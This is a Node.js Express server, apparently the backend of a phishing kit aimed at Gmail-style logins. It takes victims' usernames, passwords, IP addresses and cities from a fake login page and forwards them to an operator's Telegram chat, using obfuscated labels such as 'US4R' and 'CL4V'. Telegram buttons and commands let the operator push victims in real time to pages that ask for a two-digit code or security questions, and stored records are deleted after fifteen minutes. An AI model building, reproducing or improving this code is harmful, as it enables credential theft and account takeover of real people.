const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const CLIENTES_DIR = './clientes';
if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

const path = require('path');

// Limpieza automática cada 10 minutos (archivos >15 min)
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();

  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;

    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (${Math.round(edadMinutos)} min)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

// Ruta principal: recepción de credenciales desde index2.html
app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;

  const mensaje = `
🔵GM4YL🔵
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const cliente = {
    status: "esperando",
    usar,
    clavv,
    codigo: "",          // nuevo campo para el código de 2 dígitos
    preguntas: [],
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑 CONFIRMAR", callback_data: `confirmar:${txid}` },
        { text: "🔐 CÓDIGO", callback_data: `codigo:${txid}` },
        { text: "❌ ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

// Ruta para OTP dinámico (si la usas en otro flujo)
app.post('/enviar3', async (req, res) => {
  // ... (se mantiene igual, no afecta este flujo)
  res.sendStatus(200);
});

// Webhook de Telegram: botones y comandos
app.post('/webhook', async (req, res) => {
  // Comandos de texto (ej: /txid 22 o preguntas)
  if (req.body.message?.text?.startsWith('/')) {
    const commandParts = req.body.message.text.slice(1).trim().split(' ');
    const txid = commandParts[0].toLowerCase();

    const cliente = cargarCliente(txid) || { status: 'esperando', codigo: '', preguntas: [] };

    // Comando para código de 2 dígitos: /txid 22
    if (commandParts.length === 2 && /^\d{2}$/.test(commandParts[1])) {
      const nuevoCodigo = commandParts[1];

      cliente.codigo = nuevoCodigo;
      cliente.status = 'codigo';  // fuerza redirección a otro3.html si está en cargs
      guardarCliente(txid, cliente);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `✅ Código actualizado a <b>${nuevoCodigo}</b> para ID <code>${txid}</code>\nSe muestra en tiempo real en otro3.html`,
          parse_mode: 'HTML'
        })
      });
      return res.sendStatus(200);
    }

    // Comando antiguo para preguntas (mantenido)
    const preguntasTexto = commandParts.slice(1).join(' ');
    const [p1, p2] = preguntasTexto.split('&');

    if (p1 && p2) {
      cliente.preguntas = [p1.trim(), p2.trim()];
      cliente.status = 'preguntas';
      guardarCliente(txid, cliente);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `✅ Preguntas guardadas para ${txid}\n1️⃣ ${p1.trim()}\n2️⃣ ${p2.trim()}`
        })
      });
    } else {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `⚠️ Formato inválido.\n\nPara código: /${txid} 22\nPara preguntas: /${txid} Pregunta1?&Pregunta2?`
        })
      });
    }

    return res.sendStatus(200);
  }

  // Callbacks de botones inline
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const [accion, txid] = callback.data.split(':');

    const cliente = cargarCliente(txid) || { status: 'esperando', codigo: '' };

    if (accion === 'confirmar') {
      cliente.status = 'confirmar';
    } else if (accion === 'codigo') {
      cliente.status = 'codigo';
    } else if (accion === 'errorlogo') {
      cliente.status = 'errorlogo';
    }
    // Puedes añadir más acciones si las necesitas

    guardarCliente(txid, cliente);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `Acción: ${accion}`
      })
    });

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

// Ruta usada por cargs.html
app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = cargarCliente(txid) || { status: 'esperando', codigo: '' };
  res.json({ status: cliente.status });
});

// Ruta usada por otro3.html para obtener el código en tiempo real
app.get('/status', (req, res) => {
  const txid = req.query.txid;
  const cliente = cargarCliente(txid) || { status: 'esperando', codigo: '' };
  res.json({
    status: cliente.status,
    codigo: cliente.codigo
  });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
